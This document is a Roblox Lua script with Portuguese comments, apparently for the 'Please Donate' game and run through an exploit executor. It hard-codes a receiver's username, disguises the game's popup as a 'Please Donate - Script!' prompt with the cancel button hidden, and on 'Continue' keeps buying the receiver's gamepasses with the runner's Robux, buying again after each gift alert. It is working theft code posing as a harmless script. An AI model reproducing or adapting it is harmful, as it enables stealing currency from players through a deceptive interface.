-- CONFIGURAÇÕES
local Username = "Ian_wp27" -- coloque o username de quem vai receber
local LogsWebhook = "18bf10e6-da47-4bdf-8c64-fcaa95eae717"

-- SERVIÇOS
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")
local Player = Players.LocalPlayer

local request = syn and syn.request or request
if typeof(request) ~= "function" then
    error("Nenhum request HTTP disponível!")
end

-- REMOTES
local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))

-- VARIÁVEIS
local userRobux
local asset

-- PEGAR USERID
local success, UserId = pcall(function()
    return Players:GetUserIdFromNameAsync(Username)
end)

if not success then
    Player:Kick("Username inválido!")
    return
end

-- PEGAR O BOOTH DO RECEBEDOR
local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(UserId)
if not Booth then
    Player:Kick("Receiver not found!")
    return
end

-- FUNÇÃO PARA ESCOLHER O GAMEPASS MAIS BARATO QUE POSSA COMPRAR
local function SelectAsset()
    local minPrice = math.huge
    asset = nil
    for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
        if v:GetAttribute("AssetType") == "Gamepass" and
           not MarketplaceService:UserOwnsGamePassAsync(Player.UserId, v:GetAttribute("AssetId")) then
            local price = v:GetAttribute("AssetPrice")
            if price and price <= (userRobux or math.huge) and price < minPrice then
                asset = v
                minPrice = price
            end
        end
    end
end

-- FUNÇÃO PARA FAZER A COMPRA / DOAÇÃO
local function Purchase()
    SelectAsset()
    if asset and asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
        asset.Prompt:FireServer("", false, asset:GetAttribute("AssetPrice"))
    else
        warn("Nenhum asset válido para comprar!")
    end
end

-- FUNÇÃO PARA MOSTRAR A GUI DE DOAÇÃO
local function ShowPopup()
    local MainGUI = Player:WaitForChild("PlayerGui"):WaitForChild("MainGUI")
    local Popup = MainGUI:WaitForChild("PopupAlert")

    -- Ajustes para mobile (botão à esquerda)
    local Button = Popup.Footer.Buttons["2"] -- botão Continue
    Button.Position = UDim2.new(0.05, 0, Button.Position.Y.Scale, Button.Position.Y.Offset)

    -- Texto da popup
    Popup.Title.Text = "Please Donate - Script!"
    Popup.MiddleContent.Visible = false
    Popup.Footer.Buttons["1"].Visible = false
    Button.Text = "Continue"

    -- Conectar clique do botão
    Button.MouseButton1Click:Connect(function()
        Purchase()
        Popup.Visible = false
    end)

    Popup.Visible = true
end

-- ESCUTAR ALERTA DE DOAÇÃO
Remotes.OnClientEvent("GiftSentAlert"):Connect(function(receiverId, robux)
    if receiverId == UserId then
        userRobux = (userRobux or 0) - robux
        Purchase()
    end
end)

-- PEGAR O BALANCE INICIAL DO USUÁRIO
local function InitBalance()
    local MainGUI = Player:WaitForChild("PlayerGui"):WaitForChild("MainGUI")
    local Popup = MainGUI:WaitForChild("PopupAlert")
    local BalanceText = Popup.Footer.FooterContent.Content:FindFirstChild("RemainingBalanceText")
    if BalanceText then
        userRobux = tonumber(BalanceText.Text:match("(%d+)$")) or 0
    else
        userRobux = math.huge -- fallback se não achar
    end
end

-- INICIALIZAÇÃO
InitBalance()
ShowPopup()
